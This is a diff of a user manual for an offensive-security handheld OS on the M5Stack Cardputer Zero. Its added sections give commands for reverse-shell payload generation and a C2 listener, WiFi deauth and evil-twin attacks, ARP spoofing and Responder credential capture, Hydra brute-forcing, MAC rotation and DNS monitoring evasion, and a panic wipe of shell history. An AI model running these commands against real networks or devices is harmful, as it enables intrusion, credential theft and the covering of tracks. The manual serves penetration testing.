@@ -2,7 +2,7 @@
 
 **Complete guide to building, flashing, and operating ZERO-DAY OS on the M5Stack Cardputer Zero.**
 
-*Last updated: 2026-04-25*
+*Last updated: 2026-04-26*
 
 ---
 
@@ -283,22 +283,26 @@ The Cardputer Zero has a 46-key matrix keyboard. The `Fn` key (bottom-left) acts
 
 ## 7. The Flipper TUI
 
-The `cyber_launcher` is a Textual (Python) TUI application that provides a Flipper Zero-style interface on the 1.9" LCD. It has three levels of navigation:
+The `cyber_launcher` is a Pygame (SDL2) GUI application that provides a Flipper Zero-style interface on the 1.9" LCD. It has three levels of navigation:
 
-**Level 1 — Category Grid:**
+**Level 1 — Category Grid (4×3):**
 ```
 ┌────────┬────────┬────────┬────────┐
 │  WIFI  │M5MON │  NET   │   BT   │
 ├────────┼────────┼────────┼────────┤
-│   IR   │  CAM   │ PAYLD  │ RADIO  │
+│  IR   │  CAM   │ PAYLD  │ RADIO  │
 ├────────┼────────┼────────┼────────┤
-│ SHELL  │  SYS   │ OPEN   │        │
+│MEDIA  │ SHELL  │  SYS   │  OPEN  │
 └────────┴────────┴────────┴────────┘
 ```
 
-**Level 2 — Tool List:** Shows all tools in the selected category.
+**Level 2 — Tool List:** Shows all tools in the selected category with descriptions.
 
-**Level 3 — Guided Actions:** Pre-configured commands with placeholder arguments.
+**Level 3 — Action/Prompt:** Pre-configured commands with validated input fields.
+
+**Inline modes** (no terminal needed):
+- **Walkie Talkie** (RADIO): Push-to-talk via UDP broadcast
+- **Media Player** (MEDIA): Danish web radio + local music player
 
 | Key | Action |
 |---|---|
@@ -317,6 +321,22 @@ The `cyber_launcher` is a Textual (Python) TUI application that provides a Flipp
 ```bash
 sudo wifi-scan wlan0          # Built-in WiFi
 sudo wifi-scan wlan1          # Dongle (if connected)
+```
+
+### Continuous WiFi survey logging
+```bash
+sudo wifi-survey-log wlan0              # Log all APs seen (indefinite)
+sudo wifi-survey-log wlan0 300          # Log for 5 minutes
+sudo wifi-survey-log wlan1 0            # Indefinite on dongle
+# Results saved to: /opt/cardputer/loot/wifi/survey_*.log
+```
+
+### Randomize MAC address (stealth)
+```bash
+sudo mac-rotate wlan0 random    # Randomize wlan0 MAC
+sudo mac-rotate wlan0 restore   # Restore original MAC
+sudo mac-rotate wlan0 status    # Show current MAC + status
+sudo mac-rotate wlan1 random    # Randomize dongle MAC
 ```
 
 ### Capture a WPA handshake
@@ -424,12 +444,79 @@ sudo net-vulnscan 192.168.1.1
 # Runs: nmap --script=vuln → nikto → whatweb
 ```
 
-### Pivoting
+### IoT-focused scanning
 ```bash
-net-pivot socks      # SOCKS5 proxy via SSH
-net-pivot chisel     # Chisel TCP tunnel
-net-pivot dns        # DNS tunnel (iodine)
-net-pivot icmp       # ICMP tunnel
+iot-scan 192.168.1.0/24             # Quick IoT scan (common ports)
+iot-scan 192.168.1.1 cameras       # RTSP, HTTP webcam, ONVIF discovery
+iot-scan 192.168.1.1 bacnet        # BACnet building automation
+iot-scan 192.168.1.1 modbus        # Modbus/TCP industrial scan
+iot-scan 192.168.1.1 deep           # All ports + version detection
+```
+
+### Web content discovery
+```bash
+gobuster dir -u http://192.168.1.1 -w /usr/share/seclists/Discovery/Web-Content/common.txt
+gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+gobuster vhost -u http://192.168.1.1 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+```
+
+### Pivoting and tunnels
+```bash
+# SOCKS5 proxy via SSH (auto-reconnect):
+tunnel-mgr socks 10.0.0.1 1080 root
+
+# Local port forward (access internal service):
+tunnel-mgr forward 8080 192.168.1.100:80 10.0.0.1
+
+# Reverse port forward (expose local service remotely):
+tunnel-mgr reverse 4444 4444 10.0.0.1
+
+# List active tunnels:
+tunnel-mgr list
+
+# Kill all tunnels:
+tunnel-mgr killall
+```
+
+### C2 (Command & Control)
+```bash
+# Start encrypted C2 listener:
+quick-c2 listen 4444              # Encrypted (TLS, default)
+quick-c2 listen 4444 no           # Plaintext (unencrypted)
+
+# Generate payload one-liners:
+quick-c2 payload bash 10.0.0.1 4444       # Bash reverse shell
+quick-c2 payload python 10.0.0.1 4444     # Python reverse shell
+quick-c2 payload socat 10.0.0.1 4444     # Socat encrypted shell
+quick-c2 payload powershell 10.0.0.1 4444 # PowerShell reverse shell
+quick-c2 payload netcat 10.0.0.1 4444    # Netcat shell
+```
+
+### DNS-over-HTTPS proxy
+```bash
+# Start DoH proxy (evades DNS monitoring):
+sudo doh-proxy start cloudflare 5353     # Cloudflare, port 5353
+sudo doh-proxy start google 5354          # Google, port 5354
+sudo doh-proxy start quad9 5355          # Quad9, port 5355
+
+# Use with dig:
+dig @127.0.0.1 -p 5353 example.com
+
+# Use with nmap:
+nmap --dns-servers 127.0.0.1:5353 target
+
+# Stop:
+doh-proxy stop
+```
+
+### MITM attacks
+```bash
+# ARP spoofing (dsniff):
+sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
+
+# Responder (LLMNR/NBT-NS poisoner):
+sudo responder -I eth0
+# Captures NTLM hashes, credentials on the wire
 ```
 
 ---
@@ -455,6 +542,14 @@ sudo bt-attack blueborne <MAC>   # BlueBorne RCE (if vulnerable)
 sudo bt-attack l2ping <MAC>      # L2CAP ping flood (DoS)
 sudo bt-attack rfcomm <MAC>      # RFCOMM port scan
 sudo bt-attack obex <MAC>        # OBEX push (send file)
+```
+
+### MITM (Bettercap)
+```bash
+sudo bettercap -I wlan0
+# Interactive MITM framework — WiFi + BLE attacks
+# Capabilities: ARP spoofing, DNS spoofing, SSL strip, packet injection
+# Use on the same network as your target
 ```
 
 ### BLE GATT exploration
@@ -517,35 +612,55 @@ cam-ocr                     # Capture + Tesseract OCR → stdout + text file
 
 ## 14. Reverse Shells & Payloads
 
-### Start a listener
+### Encrypted C2 listener
+```bash
+# Start encrypted listener (default: port 4444):
+quick-c2 listen                    # Encrypted with auto-generated TLS
+quick-c2 listen 8443 no            # Plaintext (no encryption)
+
+# Generate payload for target:
+quick-c2 payload bash 10.0.0.1 4444       # Bash reverse shell
+quick-c2 payload python 10.0.0.1 4444     # Python reverse shell
+quick-c2 payload socat 10.0.0.1 4444     # Socat encrypted shell (use with TLS listener)
+quick-c2 payload powershell 10.0.0.1 4444 # PowerShell reverse shell
+quick-c2 payload netcat 10.0.0.1 4444    # Netcat shell
+quick-c2 payload sh 10.0.0.1 4444        # Minimal sh shell
+```
+
+### Legacy shell tools
 ```bash
 revshell-listen              # Default: port 4444
 revshell-listen 8080         # Custom port
+revshell-stabilize           # PTY/TTY upgrade cheatsheet
 ```
 
-### Generate a reverse shell one-liner
+### Password cracking
 ```bash
-revshell-gen bash 10.0.0.1 4444      # Bash reverse shell
-revshell-gen python 10.0.0.1 4444    # Python reverse shell
-revshell-gen nc 10.0.0.1 4444       # Netcat reverse shell
-revshell-gen powershell 10.0.0.1 4444 # PowerShell reverse shell
-revshell-gen socat 10.0.0.1 4444     # Socat encrypted shell
+# John the Ripper (on-device, works on 512MB RAM):
+john --format=raw-md5 hashes.txt              # MD5 hashes
+john --format=raw-sha256 hashes.txt            # SHA-256
+john --format=nt hashes.txt                    # NTLM (Windows)
+john --format=bcrypt hashes.txt                # bcrypt (slow but works)
+john --wordlist=/usr/share/seclists/Passwords/rockyou.txt hashes.txt
+
+# Hydra (online credential brute-forcing):
+hydra -l admin -P /usr/share/seclists/Passwords/rockyou.txt ssh://192.168.1.1
+hydra -l root -P wordlist.txt ftp://192.168.1.1
+hydra -L userlist.txt -P passlist.txt http-post-form://192.168.1.1/login.php
 ```
 
-### Upgrade to a full TTY
+### Handshake conversion (for off-device cracking)
 ```bash
-revshell-stabilize
-# Shows step-by-step instructions for:
-# - Python PTY upgrade
-# - stty raw + echo
-# - Full TTY with vim/bash
+# Convert captured .cap files for hashcat (desktop GPU cracking):
+cap2hccapx /opt/cardputer/handshakes/handshake.cap output.hccapx
+# Then transfer .hccapx to your desktop GPU cracker
 ```
 
-### Craft payloads with msfvenom
+### Searchsploit — find known exploits
 ```bash
-payload-craft armle 10.0.0.1 4444 elf    # ARM Linux payload
-payload-craft win 10.0.0.1 4444 exe       # Windows .exe
-payload-craft android 10.0.0.1 4444 apk   # Android APK
+searchsploit apache 2.4           # Search by keyword
+searchsploit --exclude-poc windows remote  # Filter by type
+searchsploit -x 12345              # Examine a specific exploit
 ```
 
 ---
@@ -1142,7 +1257,7 @@ Fn + P
 
 | Phase | Duration | Action |
 |---|---|---|
-| Kill | 0.1s | `kill -9` every offensive process (aircrack, bettercap, nmap, msfconsole, kismet, all shells) |
+| Kill | 0.1s | `kill -9` every offensive process (aircrack, bettercap, nmap, john, hydra, all shells) |
 | Wipe | 0.1s | Remove `~/.bash_history`, `/tmp/*`, tmux history |
 | Sanitize | 0.1s | Clear terminal, reset screen buffer |
 | Silence | instant | `rfkill block all` — kill WiFi + BT radio emissions |
@@ -1278,7 +1393,7 @@ iptables -L -n
 | `/opt/cardputer/` | All user data — tools, configs, loot |
 | `/opt/cardputer/handshakes/` | WPA handshake captures (`.cap` files) |
 | `/opt/cardputer/pmkid/` | PMKID hash captures |
-| `/opt/cardputer/payloads/` | Generated payloads (msfvenom output) |
+| `/opt/cardputer/payloads/` | Generated payloads (quick-c2 output) |
 | `/opt/cardputer/workspace/` | OpenCode working directory |
 | `/opt/cardputer/loot/` | All captured data, organized by type |
 | `/opt/cardputer/config/` | Tool configs, attack profiles, wordlists |
@@ -1364,33 +1479,46 @@ Switch settings: SW1=OFF, SW2=OFF (UART mode)
 ║  OPENCODE:  Fn+O                                         ║
 ║                                                          ║
 ║  WiFi scan      sudo wifi-scan wlan0                     ║
+║  WiFi survey    sudo wifi-survey-log wlan0 300             ║
 ║  Deauth         sudo wifi-deauth wlan1 <BSSID> <CH>      ║
 ║  Handshake      sudo wifi-handshake wlan1 <BSSID> <CH>   ║
 ║  PMKID          sudo wifi-pmkid wlan1 <BSSID> <CH>       ║
 ║  Evil twin      sudo wifi-evil-twin wlan0 eth0 "SSID"   ║
-║  Crack          sudo wifi-crack /opt/cardputer/handshakes/*.cap║
+║  Crack          sudo wifi-crack *.cap                     ║
+║  MAC rotate     sudo mac-rotate wlan0 random               ║
 ║                                                          ║
 ║  Host discovery sudo net-discover eth0                   ║
 ║  Port scan      net-quickscan <IP> quick                  ║
 ║  Vuln scan      sudo net-vulnscan <IP>                   ║
+║  IoT scan       iot-scan <IP/subnet> cameras              ║
+║  C2 listener    quick-c2 listen 4444                      ║
+║  C2 payload     quick-c2 payload bash <IP> <PORT>         ║
+║  SOCKS proxy    tunnel-mgr socks <host> 1080               ║
+║  Port forward   tunnel-mgr forward 8080 <rhost:rport> <ssh>║
+║  DoH proxy     sudo doh-proxy start cloudflare 5353       ║
 ║                                                          ║
 ║  BT scan        sudo bt-scan                             ║
+║  Bettercap      sudo bettercap -I wlan0                   ║
 ║  IR capture     sudo ir-scan                             ║
 ║  Camera snap    cam-snap                                 ║
 ║  Camera OCR     cam-ocr                                  ║
+║                                                          ║
+║  Crack hashes   john --format=raw-md5 hashes.txt          ║
+║  Brute creds    hydra -l admin -P words.txt ssh://<IP>    ║
+║  Web enum       gobuster dir -u http://<IP> -w common.txt ║
 ║                                                          ║
 ║  SDR scan       sudo sdr-scan 433.0-434.0 10             ║
 ║  RF capture      sudo rf-capture 433.92 10                ║
 ║  GPIO probe      sudo gpio-probe                         ║
 ║                                                          ║
 ║  Revshell       revshell-listen 4444                     ║
-║  Payload        payload-craft armle <IP> <PORT> elf      ║
+║  C2 payload     quick-c2 payload bash <IP> 4444           ║
 ║                                                          ║
 ║  Dongle         dongle-setup status                      ║
 ║  MonsterC5      monsterctl status                         ║
-║  MonsterC5      monsterctl scan                           ║
 ║  JanOS TUI      install-janos run                         ║
 ║  Ragnar scan    ragnar-scan eth0 quick                    ║
+║  Loot organize  loot-organize                             ║
 ║  Battery        cardputer-battery                        ║
 ║  Power mode     power-mode stealth                       ║
 ║  USB gadget     sudo usb-gadget-mode hid                  ║
